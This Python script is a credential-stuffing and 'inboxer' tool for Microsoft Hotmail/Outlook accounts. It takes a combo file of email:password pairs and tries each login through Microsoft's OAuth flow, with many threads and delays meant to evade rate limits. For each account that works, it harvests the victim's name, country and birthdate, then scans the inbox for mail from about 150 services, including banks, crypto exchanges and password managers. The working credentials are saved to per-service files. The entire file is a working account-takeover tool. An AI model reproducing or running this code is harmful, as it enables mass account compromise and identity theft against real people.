import os, sys, io, time, json, uuid, pycountry
import datetime, requests, threading, concurrent.futures
from colorama import Fore, Style, init
import random
import re
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
from threading import Lock, Semaphore
init(autoreset=True)

# Color definitions
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE

# Colours
HEADER = Fore.CYAN
HITS_COLOR = Fore.LIGHTGREEN_EX
BAD_COLOR = Fore.LIGHTRED_EX
RETRY_COLOR = Fore.LIGHTYELLOW_EX
TFA_COLOR = Fore.MAGENTA
WHITE = Fore.WHITE
INFO = Fore.CYAN
SUCCESS = Fore.GREEN
ERROR = Fore.RED
WARNING = Fore.YELLOW
MAGENTA = Fore.MAGENTA

# Global counters and locks
lock = threading.Lock()
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
linked_accounts = {}
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)

class PremiumSpotifyChecker:
    def __init__(self):
        self.session = requests.Session()
    
    def generate_guid(self):
        return f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
    
    def get_country_flag(self, country_code):
        flags = {
            "US": "🇺🇸", "GB": "🇬🇧", "TR": "🇹🇷", "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹",
            "ES": "🇪🇸", "RU": "🇷🇺", "CN": "🇨🇳", "JP": "🇯🇵", "KR": "🇰🇷", "BR": "🇧🇷",
            "IN": "🇮🇳", "CA": "🇨🇦", "AU": "🇦🇺", "ID": "🇮🇩", "VN": "🇻🇳", "TH": "🇹🇭"
        }
        return flags.get(country_code.upper() if country_code else "US", "🇺🇳")

def display_banner():
    """Display the script banner"""
    banner = f"""
{G}{W}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    print(banner)

def animated_footer():
    time.sleep(0.6)
    footer = (
        f"\033[1m"
        f"{R}{W}"
        f"{B}{R}☠🫵{W}"
        f"{G}  ZEN ACCOUNT CHECKER  "
        f"{B}{R}☠🫵{W}{R}\033[0m"
    )
    print(footer)

def get_flag(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except LookupError:
        return '🏳'

def update_progress():
    """Update the progress display with current statistics"""
    global hit, bad, retry, processed, total_combos, linked_accounts
    
    with lock:
        # FIX: Ensure progress doesn't exceed 100%
        progress_percent = min((processed / total_combos * 100), 100) if total_combos > 0 else 0
        linked_total = sum(linked_accounts.values())
        
        sys.stdout.write(f"\r{WHITE}Progress: {processed}/{total_combos} ({progress_percent:.1f}%) | "
                        f"{HITS_COLOR}Hits: {hit} {WHITE}| "
                        f"{BAD_COLOR}Bad: {bad} {WHITE}| "
                        f"{RETRY_COLOR}Retries: {retry} {WHITE}| "
                        f"Linked: {linked_total}")
        sys.stdout.flush()

# Service definitions with output file mapping
services = {
    # Social Media
    "Facebook": {"sender": "security@facebookmail.com", "file": "facebook_accounts.txt"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "instagram_accounts.txt"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "tiktok_accounts.txt"},
    "Twitter": {"sender": "info@x.com", "file": "twitter_accounts.txt"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "linkedin_accounts.txt"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "pinterest_accounts.txt"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "reddit_accounts.txt"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "snapchat_accounts.txt"},
    "VK": {"sender": "noreply@vk.com", "file": "vk_accounts.txt"},
    "WeChat": {"sender": "no-reply@wechat.com", "file": "wechat_accounts.txt"},
    
    # Messaging
    "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "whatsapp_accounts.txt"},
    "Telegram": {"sender": "telegram.org", "file": "telegram_accounts.txt"},
    "Discord": {"sender": "noreply@discord.com", "file": "discord_accounts.txt"},
    "Signal": {"sender": "no-reply@signal.org", "file": "signal_accounts.txt"},
    "Line": {"sender": "no-reply@line.me", "file": "line_accounts.txt"},
    
    # Streaming & Entertainment
    "Netflix": {"sender": "info@account.netflix.com", "file": "netflix_accounts.txt"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "spotify_accounts.txt"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "twitch_accounts.txt"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "youtube_accounts.txt"},
    "Vimeo": {"sender": "noreply@vimeo.com", "file": "vimeo_accounts.txt"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "disneyplus_accounts.txt"},
    "Hulu": {"sender": "account@hulu.com", "file": "hulu_accounts.txt"},
    "HBO Max": {"sender": "no-reply@hbomax.com", "file": "hbomax_accounts.txt"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "amazonprime_accounts.txt"},
    "Apple TV+": {"sender": "no-reply@apple.com", "file": "appletv_accounts.txt"},
    "Crunchyroll": {"sender": "noreply@crunchyroll.com", "file": "crunchyroll_accounts.txt"},
    
    # E-commerce & Shopping
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "amazon_accounts.txt"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "ebay_accounts.txt"},
    "Shopify": {"sender": "no-reply@shopify.com", "file": "shopify_accounts.txt"},
    "Etsy": {"sender": "transaction@etsy.com", "file": "etsy_accounts.txt"},
    "AliExpress": {"sender": "no-reply@aliexpress.com", "file": "aliexpress_accounts.txt"},
    "Walmart": {"sender": "no-reply@walmart.com", "file": "walmart_accounts.txt"},
    "Target": {"sender": "no-reply@target.com", "file": "target_accounts.txt"},
    "Best Buy": {"sender": "no-reply@bestbuy.com", "file": "bestbuy_accounts.txt"},
    "Newegg": {"sender": "no-reply@newegg.com", "file": "newegg_accounts.txt"},
    "Wish": {"sender": "no-reply@wish.com", "file": "wish_accounts.txt"},
    
    # Payment & Finance
    "PayPal": {"sender": "service@paypal.com.br", "file": "paypal_accounts.txt"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "binance_accounts.txt"},
    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "coinbase_accounts.txt"},
    "Kraken": {"sender": "no-reply@kraken.com", "file": "kraken_accounts.txt"},
    "Bitfinex": {"sender": "no-reply@bitfinex.com", "file": "bitfinex_accounts.txt"},
    "OKX": {"sender": "noreply@okx.com", "file": "okx_accounts.txt"},
    "Bybit": {"sender": "no-reply@bybit.com", "file": "bybit_accounts.txt"},
    "Bitkub": {"sender": "no-reply@bitkub.com", "file": "bitkub_accounts.txt"},
    "Revolut": {"sender": "no-reply@revolut.com", "file": "revolut_accounts.txt"},
    "TransferWise": {"sender": "no-reply@transferwise.com", "file": "transferwise_accounts.txt"},
    "Venmo": {"sender": "no-reply@venmo.com", "file": "venmo_accounts.txt"},
    "Cash App": {"sender": "no-reply@cash.app", "file": "cashapp_accounts.txt"},
    
    # Gaming Platforms
    "Steam": {"sender": "noreply@steampowered.com", "file": "steam_accounts.txt"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "xbox_accounts.txt"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "playstation_accounts.txt"},
    "EpicGames": {"sender": "help@acct.epicgames.com", "file": "epicgames_accounts.txt"},
    "Rockstar": {"sender": "noreply@rockstargames.com", "file": "rockstar_accounts.txt"},
    "EA Sports": {"sender": "EA@e.ea.com", "file": "easports_accounts.txt"},
    "Ubisoft": {"sender": "noreply@ubisoft.com", "file": "ubisoft_accounts.txt"},
    "Blizzard": {"sender": "noreply@blizzard.com", "file": "blizzard_accounts.txt"},
    "Riot Games": {"sender": "no-reply@riotgames.com", "file": "riotgames_accounts.txt"},
    "Valorant": {"sender": "noreply@valorant.com", "file": "valorant_accounts.txt"},
    "Genshin Impact": {"sender": "noreply@hoyoverse.com", "file": "genshin_accounts.txt"},
    "PUBG": {"sender": "noreply@pubgmobile.com", "file": "pubg_accounts.txt"},
    "Free Fire": {"sender": "noreply@freefire.com", "file": "freefire_accounts.txt"},
    "Mobile Legends": {"sender": "noreply@mobilelegends.com", "file": "mobilelegends_accounts.txt"},
    "Call of Duty": {"sender": "noreply@callofduty.com", "file": "cod_accounts.txt"},
    "Fortnite": {"sender": "noreply@epicgames.com", "file": "fortnite_accounts.txt"},
    "Roblox": {"sender": "accounts@roblox.com", "file": "roblox_accounts.txt"},
    "Minecraft": {"sender": "noreply@mojang.com", "file": "minecraft_accounts.txt"},
    "Supercell": {"sender": "noreply@id.supercell.com", "file": "supercell_accounts.txt"},
    "Konami": {"sender": "nintendo-noreply@ccg.nintendo.com", "file": "konami_accounts.txt"},
    "Nintendo": {"sender": "no-reply@accounts.nintendo.com", "file": "nintendo_accounts.txt"},
    "Origin": {"sender": "noreply@ea.com", "file": "origin_accounts.txt"},
    "Wild Rift": {"sender": "no-reply@wildrift.riotgames.com", "file": "wildrift_accounts.txt"},
    "Apex Legends": {"sender": "noreply@ea.com", "file": "apexlegends_accounts.txt"},
    "League of Legends": {"sender": "no-reply@riotgames.com", "file": "lol_accounts.txt"},
    "Dota 2": {"sender": "noreply@valvesoftware.com", "file": "dota2_accounts.txt"},
    "CS:GO": {"sender": "noreply@valvesoftware.com", "file": "csgo_accounts.txt"},
    "GTA Online": {"sender": "noreply@rockstargames.com", "file": "gtaonline_accounts.txt"},
    "Among Us": {"sender": "no-reply@innersloth.com", "file": "amongus_accounts.txt"},
    "Fall Guys": {"sender": "no-reply@mediatonic.co.uk", "file": "fallguys_accounts.txt"},
    
    # Tech & Productivity
    "Google": {"sender": "no-reply@accounts.google.com", "file": "google_accounts.txt"},
    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com", "file": "microsoft_accounts.txt"},
    "Apple": {"sender": "no-reply@apple.com", "file": "apple_accounts.txt"},
    "Yahoo": {"sender": "info@yahoo.com", "file": "yahoo_accounts.txt"},
    "GitHub": {"sender": "noreply@github.com", "file": "github_accounts.txt"},
    "Dropbox": {"sender": "no-reply@dropbox.com", "file": "dropbox_accounts.txt"},
    "Zoom": {"sender": "no-reply@zoom.us", "file": "zoom_accounts.txt"},
    "Slack": {"sender": "no-reply@slack.com", "file": "slack_accounts.txt"},
    "Trello": {"sender": "no-reply@trello.com", "file": "trello_accounts.txt"},
    "Asana": {"sender": "no-reply@asana.com", "file": "asana_accounts.txt"},
    "Notion": {"sender": "no-reply@notion.so", "file": "notion_accounts.txt"},
    "Evernote": {"sender": "no-reply@evernote.com", "file": "evernote_accounts.txt"},
    "WordPress": {"sender": "no-reply@wordpress.com", "file": "wordpress_accounts.txt"},
    "Medium": {"sender": "noreply@medium.com", "file": "medium_accounts.txt"},
    "Quora": {"sender": "no-reply@quora.com", "file": "quora_accounts.txt"},
    "StackOverflow": {"sender": "do-not-reply@stackoverflow.email", "file": "stackoverflow_accounts.txt"},
    "Adobe": {"sender": "no-reply@adobe.com", "file": "adobe_accounts.txt"},
    "Canva": {"sender": "no-reply@canva.com", "file": "canva_accounts.txt"},
    "Atlassian": {"sender": "no-reply@atlassian.com", "file": "atlassian_accounts.txt"},
    "Jira": {"sender": "no-reply@atlassian.com", "file": "jira_accounts.txt"},
    
    # Security & Password Managers
    "LastPass": {"sender": "no-reply@lastpass.com", "file": "lastpass_accounts.txt"},
    "1Password": {"sender": "no-reply@1password.com", "file": "1password_accounts.txt"},
    "Dashlane": {"sender": "no-reply@dashlane.com", "file": "dashlane_accounts.txt"},
    "NordVPN": {"sender": "no-reply@nordvpn.com", "file": "nordvpn_accounts.txt"},
    "ExpressVPN": {"sender": "no-reply@expressvpn.com", "file": "expressvpn_accounts.txt"},
    "Surfshark": {"sender": "no-reply@surfshark.com", "file": "surfshark_accounts.txt"},
    "ProtonMail": {"sender": "no-reply@protonmail.com", "file": "protonmail_accounts.txt"},
    "Bitwarden": {"sender": "no-reply@bitwarden.com", "file": "bitwarden_accounts.txt"},
    
    # Travel & Transportation
    "Airbnb": {"sender": "no-reply@airbnb.com", "file": "airbnb_accounts.txt"},
    "Booking.com": {"sender": "no-reply@booking.com", "file": "booking_accounts.txt"},
    "Uber": {"sender": "no-reply@uber.com", "file": "uber_accounts.txt"},
    "Lyft": {"sender": "no-reply@lyft.com", "file": "lyft_accounts.txt"},
    "Grab": {"sender": "no-reply@grab.com", "file": "grab_accounts.txt"},
    "Expedia": {"sender": "no-reply@expedia.com", "file": "expedia_accounts.txt"},
    "TripAdvisor": {"sender": "no-reply@tripadvisor.com", "file": "tripadvisor_accounts.txt"},
    "Kayak": {"sender": "no-reply@kayak.com", "file": "kayak_accounts.txt"},
    "Skyscanner": {"sender": "no-reply@skyscanner.net", "file": "skyscanner_accounts.txt"},
    
    # Food Delivery
    "Foodpanda": {"sender": "no-reply@foodpanda.com", "file": "foodpanda_accounts.txt"},
    "Uber Eats": {"sender": "no-reply@ubereats.com", "file": "ubereats_accounts.txt"},
    "Grubhub": {"sender": "no-reply@grubhub.com", "file": "grubhub_accounts.txt"},
    "DoorDash": {"sender": "no-reply@doordash.com", "file": "doordash_accounts.txt"},
    "Zomato": {"sender": "no-reply@zomato.com", "file": "zomato_accounts.txt"},
    "Swiggy": {"sender": "no-reply@swiggy.com", "file": "swiggy_accounts.txt"},
    "Deliveroo": {"sender": "no-reply@deliveroo.co.uk", "file": "deliveroo_accounts.txt"},
    "Postmates": {"sender": "no-reply@postmates.com", "file": "postmates_accounts.txt"},
    
    # Other Services
    "Depop": {"sender": "security@auth.depop.com", "file": "depop_accounts.txt"},
    "Reverb": {"sender": "info@reverb.com", "file": "reverb_accounts.txt"},
    "Pinkbike": {"sender": "signup@pinkbike.com", "file": "pinkbike_accounts.txt"},
    "OnlyFans": {"sender": "noreply@onlyfans.com", "file": "onlyfans_accounts.txt"},
    "Patreon": {"sender": "no-reply@patreon.com", "file": "patreon_accounts.txt"},
    "Tinder": {"sender": "no-reply@tinder.com", "file": "tinder_accounts.txt"},
    "Bumble": {"sender": "no-reply@bumble.com", "file": "bumble_accounts.txt"},
    "OkCupid": {"sender": "no-reply@okcupid.com", "file": "okcupid_accounts.txt"},
    "Grindr": {"sender": "no-reply@grindr.com", "file": "grindr_accounts.txt"},
    "Meetup": {"sender": "no-reply@meetup.com", "file": "meetup_accounts.txt"},
    "Eventbrite": {"sender": "no-reply@eventbrite.com", "file": "eventbrite_accounts.txt"},
    "Kickstarter": {"sender": "no-reply@kickstarter.com", "file": "kickstarter_accounts.txt"},
    "Indiegogo": {"sender": "no-reply@indiegogo.com", "file": "indiegogo_accounts.txt"},
    "GoFundMe": {"sender": "no-reply@gofundme.com", "file": "gofundme_accounts.txt"},
}

def save_account_by_type(service_name, email, password):
    """Save account to appropriate service file in Accounts folder"""
    if service_name in services:
        # Create Accounts folder if it doesn't exist
        if not os.path.exists("Accounts"):
            os.makedirs("Accounts")
            
        filename = os.path.join("Accounts", services[service_name]["file"])
        account_line = f"{email}:{password}\n"
        
        # Check if account already exists in the file to avoid duplicates
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                existing_accounts = f.readlines()
            
            if account_line not in existing_accounts:
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(account_line)
        else:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(account_line)
        
        # Update linked accounts counter
        with lock:
            if service_name in linked_accounts:
                linked_accounts[service_name] += 1
            else:
                linked_accounts[service_name] = 1

def get_capture(email, password, token, cid):
    global hit, processed
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=30).json()
        name = response.get('names', [{}])[0].get('displayName', 'Unknown')
        country = response.get('accounts', [{}])[0].get('location', 'Unknown')
        flag = get_flag(country)
        
        # Handle birthdate extraction safely
        try:
            birthdate = "{:04d}-{:02d}-{:02d}".format(
                response["accounts"][0]["birthYear"],
                response["accounts"][0]["birthMonth"],
                response["accounts"][0]["birthDay"]
            )
        except (KeyError, IndexError):
            birthdate = "Unknown"

        # --------- Inbox Request ---------
        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": f"{cid}",
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": f"{cid}",
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        inbox_response = requests.post(url, headers=headers, data="", timeout=30).text

        # --------- Check Linked Services ---------
        linked_services = []
        for service_name, service_info in services.items():
            sender = service_info["sender"]
            if sender in inbox_response:
                count = inbox_response.count(sender)
                linked_services.append(f"[✔] {service_name} (Messages: {count})")
                # Save to service-specific file
                save_account_by_type(service_name, email, password)

        linked_services_str = "\n".join(linked_services) if linked_services else "[×] No linked services found."

        capture = f"""
~~~~~~~~~~~~~~ Sukuna ~~~~~~~~~~~~~~
Email : {email}
Password : {password}

Name : {name}
Country : {flag} {country}
Birthdate : {birthdate}

Linked Services :
{linked_services_str}
by : @BaignX
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
        with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
            f.write(capture)
            
        with lock:
            hit += 1
            processed += 1
            
    except Exception as e:
        with lock:
            processed += 1
    finally:
        update_progress()

def check_account(email, password):
    """Fixed login flow with better error handling"""
    try:
        session = requests.Session()
        
        # IDP Check
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)
        
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return {"status": "BAD"}
        
        # OAuth
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        
        if not url_match or not ppft_match:
            return {"status": "BAD"}
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        # Login
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        
        r3 = session.post(post_url, data=login_data, headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }, allow_redirects=False, timeout=15)
        
        # Better error detection
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
            return {"status": "BAD"}
        
        # Check for account locked or abuse detection
        if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
            return {"status": "BAD"}
            
        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "BAD"}
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "BAD"}
        
        code = code_match.group(1)
        
        # Token
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text:
            return {"status": "BAD"}
        
        token_json = r4.json()
        access_token = token_json["access_token"]
        
        # CID
        mspcid = None
        for cookie in session.cookies:
            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        get_capture(email, password, access_token, cid)
        return {"status": "HIT"}
        
    except requests.exceptions.Timeout:
        return {"status": "RETRY"}
    except Exception as e:
        return {"status": "RETRY"}

def check_combo(email, password):
    global hit, bad, retry, processed
    
    # Skip if account was already checked
    account_id = f"{email}:{password}"
    if account_id in checked_accounts:
        with lock:
            processed += 1
        update_progress()
        return
        
    checked_accounts.add(account_id)
    
    # Use semaphore to limit concurrent requests
    with rate_limit_semaphore:
        # Add small delay to avoid rate limiting
        time.sleep(random.uniform(0.01, 0.05))
        
        result = check_account(email, password)
        
        # FIXED: Proper status handling with accurate counters
        with lock:
            if result["status"] == "HIT":
                hit += 1
            elif result["status"] == "BAD":
                bad += 1
            elif result["status"] == "RETRY":
                retry += 1
            else:
                bad += 1  # Handle any unknown status as BAD
            
            processed += 1
        
        update_progress()
        
def main():
    global total_combos, processed
    
    # Display banner
    display_banner()
    print(f"{G} [✔️] Tool by: Sukuna {W}")
    print(f"--" * 25)
    
    file_path = input(" -- Zen | Hotmail MFC V7 Premium - Inboxer & Full Capture\n\n -[$] Put Combo File: ")
    
    # FIXED: Validate thread input
    while True:
        try:
            num_threads = int(input("  [-] Threads (20-200 recommended): "))
            if 1 <= num_threads <= 1000:
                break
            else:
                print(f"{ERROR}[!] Please enter a number between 1-1000")
        except ValueError:
            print(f"{ERROR}[!] Please enter a valid number")
    
    # Create output files for each service in Accounts folder
    if not os.path.exists("Accounts"):
        os.makedirs("Accounts")
    
    for service_info in services.values():
        open(os.path.join("Accounts", service_info["file"]), 'a').close()
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if ":" in line]
        total_combos = len(lines)
    except FileNotFoundError:
        print(f"{ERROR}[!] File not found: {file_path}")
        exit(1)
    except Exception as e:
        print(f"{ERROR}[!] Error reading file: {e}")
        exit(1)
    
    print("--" * 25)
    print(f"{INFO}[*] Total combos: {total_combos}")
    print(f"{INFO}[*] Starting check with {num_threads} threads...")
    time.sleep(2)
    
    # Initialize progress display
    update_progress()
    
    # FIXED: Better thread management
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for line in lines:
            try:
                email, password = line.split(":", 1)
                futures.append(executor.submit(check_combo, email.strip(), password.strip()))
            except ValueError:
                continue
        
        # Wait for all tasks to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                with lock:
                    retry += 1
                    processed += 1
                update_progress()
    
    # Final statistics
    print(f"\n\n{SUCCESS} [✔️] Done!")
    print(f"{INFO} Final Statistics:")
    print(f"{HITS_COLOR} Hits: {hit} {WHITE}| {BAD_COLOR}Bad: {bad} {WHITE}| {RETRY_COLOR}Retries: {retry}")
    
    if linked_accounts:
        print(f"{INFO} Linked Accounts by Service:")
        for service, count in sorted(linked_accounts.items(), key=lambda x: x[1], reverse=True):
            print(f"  {service}: {count}")
    
    print(f"{INFO} Account files created in Accounts folder:")
    account_files = []
    for service_name, service_info in services.items():
        file_path = os.path.join("Accounts", service_info["file"])
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            account_files.append(service_info["file"])
    
    if account_files:
        for file in sorted(account_files):
            print(f"  {file}")
    else:
        print(f"  {WARNING}No account files created")
    
    # Display animated footer
    animated_footer()

if __name__ == "__main__":
    main()
